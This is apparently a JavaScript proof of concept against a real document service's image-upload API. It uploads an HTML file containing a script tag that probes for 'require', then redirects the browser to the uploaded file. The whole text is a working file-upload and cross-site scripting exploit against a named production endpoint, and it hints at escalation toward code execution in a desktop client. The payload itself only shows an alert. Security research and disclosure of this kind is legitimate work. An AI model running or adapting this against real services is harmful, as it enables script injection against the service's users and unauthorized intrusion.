var html = '<html><body><script>alert(typeof require)</script></body></html>';
var blob = new Blob([html], {
    type: 'text/html'
});
var fd = new
FormData();
fd.append('file', blob, 'poc.html');
fd.append('customName', 'poc_test_12345');
fetch('https://docs.qq.com/api/docsdata/image/upload?globalPadId=550e8400-e29b-41d4-a716-446655440000&usage=1', {
    method: 'POST',
    body: fd
}).then(function (r) {
    return r.text()
}).then(function (d) {
    var xx = JSON.parse(d);location.href = xx.url;
}).catch(function (e) {
    console.log('UPLOAD ERROR:', e)
});